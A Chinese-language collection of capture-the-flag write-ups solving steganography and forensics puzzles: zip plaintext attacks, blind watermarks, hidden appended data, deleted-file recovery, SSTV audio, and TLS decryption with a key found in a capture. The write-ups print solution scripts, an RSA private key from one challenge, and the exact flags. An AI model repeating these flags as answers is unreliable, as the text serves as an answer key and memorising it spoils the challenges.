给了一个伪加密zip文件，ZipCenOp处理得到一个压缩文件和一个word文件。zip文件里面有一个txt，猜测word的内容可以作为明文攻击数据。

word文件全选→字体→隐藏，发现隐藏字符串，写入txt文件中（需要用GBK编码保存，否则crc32不对），压缩后明文爆破得到flag.png。最后Stegsolve查看rgb的0通道LSB获得flag。

###### voip

VoIP数据包，用Wireshark打开，点击电话→VoIP通话进行播放得到flag。

###### [GWCTF2019]huyao

给了两张长得一样的图片，猜测是盲水印，但是尝试常规盲水印隐写无效，查阅资料后发现有个频域盲水印隐写：

```python
# coding=utf-8
import cv2
import numpy as np
import random
import os
from argparse import ArgumentParser
ALPHA = 5


def build_parser():
    parser = ArgumentParser()
    parser.add_argument('--original', dest='ori', required=True)
    parser.add_argument('--image', dest='img', required=True)
    parser.add_argument('--result', dest='res', required=True)
    parser.add_argument('--alpha', dest='alpha', default=ALPHA)
    return parser


def main():
    parser = build_parser()
    # options = parser.parse_args()
    ori = r'C:\Users\hp430\Desktop\huyao.png'
    img = r'C:\Users\hp430\Desktop\stillhuyao.png'
    res = r'C:\Users\hp430\Desktop\r.png'
    alpha = ALPHA
    if not os.path.isfile(ori):
        parser.error("original image %s does not exist." % ori)
    if not os.path.isfile(img):
        parser.error("image %s does not exist." % img)
    decode(ori, img, res, alpha)


def decode(ori_path, img_path, res_path, alpha):
    ori = cv2.imread(ori_path)
    img = cv2.imread(img_path)
    ori_f = np.fft.fft2(ori)
    img_f = np.fft.fft2(img)
    height, width = ori.shape[0], ori.shape[1]
    watermark = (ori_f - img_f) / alpha
    watermark = np.real(watermark)
    res = np.zeros(watermark.shape)
    random.seed(height + width)
    x = range(height / 2)
    y = range(width)
    random.shuffle(x)
    random.shuffle(y)
    for i in range(height / 2):
        for j in range(width):
            res[x[i]][y[j]] = watermark[i][j]
    cv2.imwrite(res_path, res, [int(cv2.IMWRITE_JPEG_QUALITY), 100])


if __name__ == '__main__':
    main()
```

###### Business Planning Group

```
看图吧。

请将 bsides_delhi{} 换成 flag{} 提交。

由 15h3na0 师傅提供。
```

给了一张png图片，丢到010editor里面用插件看发现结尾存在其他数据：

![image-20210124211558801](/image-20210124211558801.png)

bpg开头是一种不常见的图片格式，导出结尾部分用bpgview查看发现base字符串，处理得到flag：

![image-20210124211746952](/image-20210124211746952.png)

```
root@ubuntu:/home/ctf/misc/basecrack# python3 basecrack.py

██████╗  █████╗ ███████╗███████╗ ██████╗██████╗  █████╗  ██████╗██╗  ██╗
██╔══██╗██╔══██╗██╔════╝██╔════╝██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
██████╔╝███████║███████╗█████╗  ██║     ██████╔╝███████║██║     █████╔╝
██╔══██╗██╔══██║╚════██║██╔══╝  ██║     ██╔══██╗██╔══██║██║     ██╔═██╗
██████╔╝██║  ██║███████║███████╗╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ v3.0

                python basecrack.py -h [FOR HELP]

[>] Enter Encoded Base: YnNpZGVzX2RlbGhpe0JQR19pNV9iM3R0M3JfN2g0bl9KUEd9Cg==

[>] Decoding as Base64: bsides_delhi{BPG_i5_b3tt3r_7h4n_JPG}


[-] The Encoding Scheme Is Base64
```

###### 我爱Linux

```
你知道Linux下面有哪些好玩的命令吗？比如sl，还有哪些呢？ 注意：得到的 flag 请包上 flag{} 提交
```

给了一张png图片，打不开，查看二进制信息搜索发现FFD9。在FFD9后面的数据明显是隐藏的数据。

导出后用pickle处理得到原始数据：

```python
import pickle

f = open(r'C:\Users\hp430\Desktop\1', 'rb')
a = pickle.load(f)

out = open(r'C:\Users\hp430\Desktop\result.txt', 'w')
out.write(str(a))
out.close()
```

```
[[(3, 'm'), (4, '"'), (5, '"'), (8, '"'), (9, '"'), (10, '#'), (31, 'm'), (32, '"'), (33, '"'), (44, 'm'), (45, 'm'), (46, 'm'), (47, 'm'), (50, 'm'), (51, 'm'), (52, 'm'), (53, 'm'), (54, 'm'), (55, 'm'), (58, 'm'), (59, 'm'), (60, 'm'), (61, 'm'), (66, 'm'), (67, '"'), (68, '"'), (75, '#')], [(1, 'm'), (2, 'm'), (3, '#'), (4, 'm'), (5, 'm'), (10, '#'), (16, 'm'), (17, 'm'), (18, 'm'), (23, 'm'), (24, 'm'), (25, 'm'), (26, 'm'), (31, '#'), (37, 'm'), (38, 'm'), (39, 'm'), (43, '"'), (47, '"'), (48, '#'), (54, '#'), (55, '"'), (57, '"'), (61, '"'), (62, '#'), (64, 'm'), (65, 'm'), (66, '#'), (67, 'm'), (68, 'm'), (72, 'm'), (73, 'm'), (74, 'm'), (75, '#')], [(3, '#'), (10, '#'), (15, '"'), (19, '#'), (22, '#'), (23, '"'), (25, '"'), (26, '#'), (29, 'm'), (30, 'm'), (31, '"'), (36, '"'), (40, '#'), (47, 'm'), (48, '"'), (53, 'm'), (54, '"'), (59, 'm'), (60, 'm'), (61, 'm'), (62, '"'), (66, '#'), (71, '#'), (72, '"'), (74, '"'), (75, '#')], [(3, '#'), (10, '#'), (15, 'm'), (16, '"'), (17, '"'), (18, '"'), (19, '#'), (22, '#'), (26, '#'), (31, '#'), (36, 'm'), (37, '"'), (38, '"'), (39, '"'), (40, '#'), (45, 'm'), (46, '"'), (52, 'm'), (53, '"'), (61, '"'), (62, '#'), (66, '#'), (71, '#'), (75, '#')], [(3, '#'), (10, '"'), (11, 'm'), (12, 'm'), (15, '"'), (16, 'm'), (17, 'm'), (18, '"'), (19, '#'), (22, '"'), (23, '#'), (24, 'm'), (25, '"'), (26, '#'), (31, '#'), (36, '"'), (37, 'm'), (38, 'm'), (39, '"'), (40, '#'), (43, 'm'), (44, '#'), (45, 'm'), (46, 'm'), (47, 'm'), (48, 'm'), (51, 'm'), (52, '"'), (57, '"'), (58, 'm'), (59, 'm'), (60, 'm'), (61, '#'), (62, '"'), (66, '#'), (71, '"'), (72, '#'), (73, 'm'), (74, '#'), (75, '#')], [(23, 'm'), (26, '#'), (32, '"'), (33, '"')], [(24, '"'), (25, '"')], [], [(12, '#'), (17, 'm'), (18, '"'), (19, '"'), (23, 'm'), (24, 'm'), (25, 'm'), (26, 'm'), (33, '#'), (36, 'm'), (37, 'm'), (38, 'm'), (39, 'm'), (40, 'm'), (41, 'm'), (46, 'm'), (47, 'm'), (52, 'm'), (53, 'm'), (54, 'm'), (65, 'm'), (66, 'm'), (67, 'm'), (68, 'm'), (71, 'm'), (72, 'm'), (73, 'm'), (74, 'm'), (75, 'm'), (76, 'm')], [(2, 'm'), (3, 'm'), (4, 'm'), (9, 'm'), (10, 'm'), (11, 'm'), (12, '#'), (15, 'm'), (16, 'm'), (17, '#'), (18, 'm'), (19, 'm'), (22, '"'), (26, '"'), (27, '#'), (30, 'm'), (31, 'm'), (32, 'm'), (33, '#'), (40, '#'), (41, '"'), (45, 'm'), (46, '"'), (47, '#'), (50, 'm'), (51, '"'), (55, '"'), (58, 'm'), (59, 'm'), (60, 'm'), (64, '#'), (65, '"'), (68, '"'), (69, 'm'), (75, '#'), (76, '"')], [(1, '#'), (2, '"'), (5, '#'), (8, '#'), (9, '"'), (11, '"'), (12, '#'), (17, '#'), (24, 'm'), (25, 'm'), (26, 'm'), (27, '"'), (29, '#'), (30, '"'), (32, '"'), (33, '#'), (39, 'm'), (40, '"'), (44, '#'), (45, '"'), (47, '#'), (50, '#'), (51, 'm'), (52, '"'), (53, '"'), (54, '#'), (55, 'm'), (57, '#'), (58, '"'), (61, '#'), (64, '#'), (65, 'm'), (68, 'm'), (69, '#'), (74, 'm'), (75, '"')], [(1, '#'), (2, '"'), (3, '"'), (4, '"'), (5, '"'), (8, '#'), (12, '#'), (17, '#'), (26, '"'), (27, '#'), (29, '#'), (33, '#'), (38, 'm'), (39, '"'), (43, '#'), (44, 'm'), (45, 'm'), (46, 'm'), (47, '#'), (48, 'm'), (50, '#'), (55, '#'), (57, '#'), (58, '"'), (59, '"'), (60, '"'), (61, '"'), (65, '"'), (66, '"'), (67, '"'), (69, '#'), (73, 'm'), (74, '"')], [(1, '"'), (2, '#'), (3, 'm'), (4, 'm'), (5, '"'), (8, '"'), (9, '#'), (10, 'm'), (11, '#'), (12, '#'), (17, '#'), (22, '"'), (23, 'm'), (24, 'm'), (25, 'm'), (26, '#'), (27, '"'), (29, '"'), (30, '#'), (31, 'm'), (32, '#'), (33, '#'), (37, 'm'), (38, '"'), (47, '#'), (51, '#'), (52, 'm'), (53, 'm'), (54, '#'), (55, '"'), (57, '"'), (58, '#'), (59, 'm'), (60, 'm'), (61, '"'), (64, '"'), (65, 'm'), (66, 'm'), (67, 'm'), (68, '"'), (72, 'm'), (73, '"')], [], [], [], [(5, '#'), (8, '#'), (16, 'm'), (17, 'm'), (18, 'm'), (19, 'm'), (23, 'm'), (24, 'm'), (25, 'm'), (26, 'm'), (30, 'm'), (31, 'm'), (32, 'm'), (33, 'm'), (38, 'm'), (39, 'm'), (40, 'm'), (50, '#'), (57, '#'), (64, '#'), (71, 'm'), (72, 'm'), (73, 'm')], [(2, 'm'), (3, 'm'), (4, 'm'), (5, '#'), (8, '#'), (9, 'm'), (10, 'm'), (11, 'm'), (15, '#'), (16, '"'), (19, '"'), (20, 'm'), (22, 'm'), (23, '"'), (26, '"'), (27, 'm'), (29, '#'), (34, '#'), (36, 'm'), (37, '"'), (41, '"'), (44, 'm'), (45, 'm'), (46, 'm'), (50, '#'), (51, 'm'), (52, 'm'), (53, 'm'), (57, '#'), (58, 'm'), (59, 'm'), (60, 'm'), (64, '#'), (65, 'm'), (66, 'm'), (67, 'm'), (73, '#')], [(1, '#'), (2, '"'), (4, '"'), (5, '#'), (8, '#'), (9, '"'), (11, '"'), (12, '#'), (15, '#'), (16, 'm'), (19, 'm'), (20, '#'), (22, '#'), (25, 'm'), (27, '#'), (29, '"'), (30, 'm'), (31, 'm'), (32, 'm'), (33, 'm'), (34, '"'), (36, '#'), (37, 'm'), (38, '"'), (39, '"'), (40, '#'), (41, 'm'), (43, '#'), (44, '"'), (47, '#'), (50, '#'), (51, '"'), (53, '"'), (54, '#'), (57, '#'), (58, '"'), (60, '"'), (61, '#'), (64, '#'), (65, '"'), (67, '"'), (68, '#'), (73, '#')], [(1, '#'), (5, '#'), (8, '#'), (12, '#'), (16, '"'), (17, '"'), (18, '"'), (20, '#'), (22, '#'), (27, '#'), (29, '#'), (33, '"'), (34, '#'), (36, '#'), (41, '#'), (43, '#'), (44, '"'), (45, '"'), (46, '"'), (47, '"'), (50, '#'), (54, '#'), (57, '#'), (61, '#'), (64, '#'), (68, '#'), (73, '#')], [(1, '"'), (2, '#'), (3, 'm'), (4, '#'), (5, '#'), (8, '#'), (9, '#'), (10, 'm'), (11, '#'), (12, '"'), (15, '"'), (16, 'm'), (17, 'm'), (18, 'm'), (19, '"'), (23, '#'), (24, 'm'), (25, 'm'), (26, '#'), (29, '"'), (30, '#'), (31, 'm'), (32, 'm'), (33, 'm'), (34, '"'), (37, '#'), (38, 'm'), (39, 'm'), (40, '#'), (41, '"'), (43, '"'), (44, '#'), (45, 'm'), (46, 'm'), (47, '"'), (50, '#'), (51, '#'), (52, 'm'), (53, '#'), (54, '"'), (57, '#'), (58, '#'), (59, 'm'), (60, '#'), (61, '"'), (64, '#'), (65, '#'), (66, 'm'), (67, '#'), (68, '"'), (71, 'm'), (72, 'm'), (73, '#'), (74, 'm'), (75, 'm')], [], [], [], [(2, 'm'), (3, 'm'), (4, 'm'), (5, 'm'), (8, 'm'), (9, 'm'), (10, 'm'), (11, 'm'), (12, 'm'), (19, '#'), (24, 'm'), (25, 'm'), (26, 'm'), (29, '"'), (30, '"'), (31, 'm')], [(1, '#'), (2, '"'), (5, '"'), (6, 'm'), (8, '#'), (16, 'm'), (17, 'm'), (18, 'm'), (19, '#'), (22, 'm'), (23, '"'), (27, '"'), (31, '#')], [(1, '#'), (2, 'm'), (5, 'm'), (6, '#'), (8, '"'), (9, '"'), (10, '"'), (11, '"'), (12, 'm'), (13, 'm'), (15, '#'), (16, '"'), (18, '"'), (19, '#'), (22, '#'), (23, 'm'), (24, '"'), (25, '"'), (26, '#'), (27, 'm'), (31, '"'), (32, 'm'), (33, 'm')], [(2, '"'), (3, '"'), (4, '"'), (6, '#'), (13, '#'), (15, '#'), (19, '#'), (22, '#'), (27, '#'), (31, '#')], [(1, '"'), (2, 'm'), (3, 'm'), (4, 'm'), (5, '"'), (8, '"'), (9, 'm'), (10, 'm'), (11, 'm'), (12, '#'), (13, '"'), (15, '"'), (16, '#'), (17, 'm'), (18, '#'), (19, '#'), (23, '#'), (24, 'm'), (25, 'm'), (26, '#'), (27, '"'), (31, '#')], [(29, '"'), (30, '"')]]
```

明显是坐标，生成字符图像获得flag：

```python
import pickle

list1=pickle.load(open(r'C:\Users\hp430\Desktop\1','rb'))
for list in list1:
	
	temp=[' ']*100
	for item in list:
		#print(item)
		temp[item[0]]=item[1]
	print("".join(temp))
```

```
   m""  ""#                    m""          mmmm  mmmmmm  mmmm    m""      #
 mm#mm    #     mmm    mmmm    #     mmm   "   "#     #" "   "# mm#mm   mmm#
   #      #    "   #  #" "#  mm"    "   #      m"    m"    mmm"   #    #" "#
   #      #    m"""#  #   #    #    m"""#    m"     m"       "#   #    #   #
   #      "mm  "mm"#  "#m"#    #    "mm"#  m#mmmm  m"    "mmm#"   #    "#m##
                       m  #     ""
                        ""

            #    m""   mmmm      #  mmmmmm    mm    mmm          mmmm  mmmmmm
  mmm    mmm#  mm#mm  "   "#  mmm#      #"   m"#  m"   "  mmm   #"  "m     #"
 #"  #  #" "#    #      mmm" #" "#     m"   #" #  #m""#m #"  #  #m  m#    m"
 #""""  #   #    #        "# #   #    m"   #mmm#m #    # #""""   """ #   m"
 "#mm"  "#m##    #    "mmm#" "#m##   m"        #   #mm#" "#mm"  "mmm"   m"



     #  #       mmmm   mmmm   mmmm    mmm         #      #      #      mmm
  mmm#  #mmm   #"  "m m"  "m #    # m"   "  mmm   #mmm   #mmm   #mmm     #
 #" "#  #" "#  #m  m# #  m # "mmmm" #m""#m #"  #  #" "#  #" "#  #" "#    #
 #   #  #   #   """ # #    # #   "# #    # #""""  #   #  #   #  #   #    #
 "#m##  ##m#"  "mmm"   #mm#  "#mmm"  #mm#" "#mm"  ##m#"  ##m#"  ##m#"  mm#mm



  mmmm  mmmmm      #    mmm  ""m
 #"  "m #       mmm#  m"   "   #
 #m  m# """"mm #" "#  #m""#m   "mm
  """ #      # #   #  #    #   #
 "mmm"  "mmm#" "#m##   #mm#"   #
                             ""
```

###### [XMAN2018排位赛]file

删除文件恢复：

```
root@ubuntu:/home/ctf/misc/extundelete# ./go1.sh
NOTICE: Extended attributes are not restored.
Loading filesystem metadata ... 2 groups loaded.
Group: 0
Contents of inode 2:
0000 | ed 41 00 00 00 04 00 00 fb ac f7 54 0d ad f7 54 | .A.........T...T
0010 | 0d ad f7 54 00 00 00 00 00 00 03 00 02 00 00 00 | ...T............
0020 | 00 00 08 00 18 00 00 00 0a f3 01 00 04 00 00 00 | ................
0030 | 00 00 00 00 00 00 00 00 01 00 00 00 6e 01 00 00 | ............n...
0040 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
0050 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
0060 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
0070 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................

Inode is Allocated
File mode: 16877
Low 16 bits of Owner Uid: 0
Size in bytes: 1024
Access time: 1425517819
Creation time: 1425517837
Modification time: 1425517837
Deletion Time: 0
Low 16 bits of Group Id: 0
Links count: 3
Blocks count: 2
File flags: 524288
File version (for NFS): 0
File ACL: 0
Directory ACL: 0
Fragment address: 0
Direct blocks: 127754, 4, 0, 0, 1, 366, 0, 0, 0, 0, 0, 0
Indirect block: 0
Double indirect block: 0
Triple indirect block: 0

File name                                       | Inode number | Deleted status
.                                                 2
..                                                2
lost+found                                        11
cat.jpg                                           12
cat2.jpg                                          13
cat3.jpg                                          14
cat4.jpg                                          15
cat5.jpg                                          16
cat6.jpg                                          17
.cat.jpg                                          18             Deleted
cat7.jpg                                          19
cat8.jpg                                          20
catdog.gif                                        21
catgif.gif                                        22
catsipsip.gif                                     23
catreindeer.jpg                                   24
catyum.gif                                        25
catfunnyface.jpg                                  26
catcuddle.gif                                     27
catwindow.jpg                                     28
root@ubuntu:/home/ctf/misc/extundelete# ./go2.sh
NOTICE: Extended attributes are not restored.
Loading filesystem metadata ... 2 groups loaded.
Loading journal descriptors ... 151 descriptors loaded.
root@ubuntu:/home/ctf/misc/extundelete# cd RECOVERED_FILES/
root@ubuntu:/home/ctf/misc/extundelete/RECOVERED_FILES# ls
file.18
root@ubuntu:/home/ctf/misc/extundelete/RECOVERED_FILES# cat file.18
flag{fugly_cats_need_luv_2}
root@ubuntu:/home/ctf/misc/extundelete/RECOVERED_FILES# cd ..
root@ubuntu:/home/ctf/misc/extundelete# cat go1.sh
extundelete --inode 2 attachment.img
root@ubuntu:/home/ctf/misc/extundelete# cat go2.sh
extundelete --restore-inode 18 attachment.img
```

###### [UTCTF2020]sstv

题目直接说了是sstv，给了一个wav文件，用qsstv播放后即可得到flag：

![image-20210125162816030](/image-20210125162816030.png)

###### 很好的色彩呃？

![pass](/pass.gif)

给了一张条纹图片，看RGB值的时候发现只有蓝色通道值不同，分别为97 97 112 106 101 115，转为ascii得到flag。

###### greatescape

给了个流量包，发现有tls数据，应该需要解密。

追踪tcp流，发现key：

```
-----BEGIN PRIVATE KEY-----
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
xmZSEXjNvG9grjxwR96vp1PK/4Bq1jo=
-----END PRIVATE KEY-----
```

按照编辑，首选项，proto，TLS，edit，key file的顺序导入rsa格式的解密文件。

筛选tls协议，按照数据包大小从大到小排列，追踪tls流发现flag。

###### [INSHack2019]gflag

```
M73 P0 R2
M201 X9000 Y9000 Z500 E10000
M203 X500 Y500 Z12 E120
M204 P2000 R1500 T2000
M205 X10.00 Y10.00 Z0.20 E2.50
M205 S0 T0
M107
M115 U3.1.0
M83
M204 S2000 T1500
M104 S215
M140 S60
M190 S60
M109 S215
G28 W
G80
G1 Y-3.0 F1000.0
G92 E0.0
G1 X60.0 E9.0  F1000.0
M73 P4 R1
G1 X100.0 E12.5  F1000.0
G92 E0.0
M900 K30
G21
G90
M83
G92 E0.0
G1 E-0.80000 F2100.00000
G1 Z0.600 F10800.000
G1 X89.987 Y95.416
G1 Z0.200
G1 E0.80000 F2100.00000
M204 S1000
G1 F1200
G1 X90.219 Y94.784 E0.02112
G1 X90.632 Y94.252 E0.02112
G1 X91.187 Y93.871 E0.02112
G1 X91.836 Y93.677 E0.02123
G1 X157.871 Y93.656 E2.07047
G1 X158.694 Y93.819 E0.02631
G1 X159.395 Y94.279 E0.02631
G1 X159.872 Y94.969 E0.02631
G1 X160.055 Y95.788 E0.02631
G1 X160.009 Y103.158 E0.23108
G1 X159.774 Y103.785 E0.02100
G1 X159.360 Y104.311 E0.02100
G1 X158.806 Y104.688 E0.02100
G1 X158.164 Y104.879 E0.02100
G1 X92.075 Y104.899 E2.07219
G1 X91.327 Y104.746 E0.02394
G1 X90.674 Y104.342 E0.02405
G1 X90.201 Y103.739 E0.02405
G1 X89.965 Y103.009 E0.02405
G1 X89.987 Y95.476 E0.23617
G1 F8640
G1 X90.219 Y94.784 E-0.16859
G1 X90.632 Y94.252 E-0.15550
G1 X91.187 Y93.871 E-0.15550
G1 X91.836 Y93.677 E-0.15634
G1 X92.373 Y93.676 E-0.12407
G1 E-0.04000 F2100.00000
G1 Z0.800 F10800.000
G1 X143.937 Y99.373
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X144.394 Y99.373 E0.01433
G1 X144.394 Y96.910 E0.07725
G1 X145.637 Y96.910 E0.03898
G1 X145.637 Y99.373 E0.07725
G1 X146.252 Y99.373 E0.01929
G1 X146.252 Y100.441 E0.03347
G1 X145.643 Y100.441 E0.01910
G1 X145.647 Y100.573 E0.00414
G1 X145.685 Y100.632 E0.00221
G1 X145.817 Y100.641 E0.00415
G1 X146.295 Y100.574 E0.01514
G1 X146.295 Y96.910 E0.11490
G1 X147.539 Y96.910 E0.03898
G1 X147.539 Y101.624 E0.14783
G1 X146.295 Y101.624 E0.03898
G1 X146.295 Y101.587 E0.00116
G1 X145.942 Y101.669 E0.01137
G1 X145.561 Y101.698 E0.01200
G1 X145.224 Y101.668 E0.01058
G1 X144.895 Y101.553 E0.01094
G1 X144.661 Y101.383 E0.00908
G1 X144.491 Y101.138 E0.00934
G1 X144.409 Y100.792 E0.01117
G1 X144.399 Y100.441 E0.01100
G1 X143.937 Y100.441 E0.01450
G1 X143.937 Y99.433 E0.03159
G1 X143.883 Y98.977 F10800.000
G1 F8640
G1 X144.394 Y99.373 E-0.10644
G1 X144.394 Y96.910 E-0.56891
G1 X144.761 Y96.910 E-0.08465
G1 E-0.04000 F2100.00000
G1 Z0.800 F10800.000
G1 X140.097 Y96.532
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X139.094 Y96.532 E0.03145
G1 X139.022 Y96.505 E0.00241
G1 X138.551 Y96.463 E0.01483
G1 X138.075 Y96.548 E0.01516
G1 X137.846 Y96.635 E0.00769
G1 X137.540 Y96.835 E0.01146
G1 X137.241 Y97.105 E0.01261
G1 X137.088 Y97.366 E0.00949
G1 X136.812 Y97.017 E0.01394
G1 X136.491 Y96.777 E0.01258
G1 X136.143 Y96.590 E0.01237
G1 X135.761 Y96.495 E0.01234
G1 X135.380 Y96.457 E0.01200
G1 X135.122 Y96.479 E0.00813
G1 X134.678 Y96.560 E0.01417
G1 X134.299 Y96.748 E0.01326
G1 X133.449 Y96.496 E0.02779
G1 X132.917 Y96.462 E0.01672
G1 X132.539 Y96.523 E0.01199
G1 X132.132 Y96.709 E0.01404
G1 X131.923 Y96.912 E0.00913
G1 X131.923 Y96.532 E0.01189
G1 X129.925 Y96.532 E0.06263
G1 X129.922 Y98.875 E0.07345
G1 X129.910 Y96.532 E0.07345
G1 X127.912 Y96.532 E0.06262
G1 X127.912 Y100.818 E0.13437
G1 X129.816 Y100.818 E0.05968
G1 X130.273 Y100.892 E0.01454
G1 X130.660 Y100.856 E0.01217
G1 X131.018 Y100.745 E0.01178
G1 X131.243 Y100.621 E0.00805
G1 X131.243 Y100.818 E0.00617
G1 X131.621 Y100.818 E0.01185
G1 X131.621 Y101.187 E0.01156
G1 X133.233 Y102.124 E0.05846
G1 X92.720 Y102.124 E1.27026
G1 X92.720 Y102.002 E0.00384
G1 X95.014 Y102.002 E0.07191
G1 X95.856 Y100.628 E0.05052
G1 X95.856 Y102.002 E0.04308
G1 X97.836 Y102.002 E0.06208
G1 X97.836 Y101.279 E0.02264
G1 X98.146 Y101.621 E0.01445
G1 X98.589 Y101.883 E0.01614
G1 X99.124 Y102.034 E0.01744
G1 X99.678 Y102.076 E0.01742
G1 X100.257 Y102.034 E0.01822
G1 X100.685 Y101.915 E0.01391
G1 X101.258 Y101.597 E0.02054
G1 X101.536 Y101.281 E0.01321
G1 X101.742 Y100.952 E0.01217
G1 X101.853 Y100.581 E0.01213
G1 X101.985 Y99.629 E0.03015
G1 X101.567 Y99.610 E0.01313
G1 X101.768 Y99.365 E0.00995
G1 X101.879 Y99.118 E0.00849
G1 X103.002 Y102.002 E0.09702
G1 X104.718 Y102.002 E0.05379
G1 X105.705 Y99.536 E0.08328
G1 X106.260 Y99.621 E0.01759
G1 X106.284 Y99.758 E0.00437
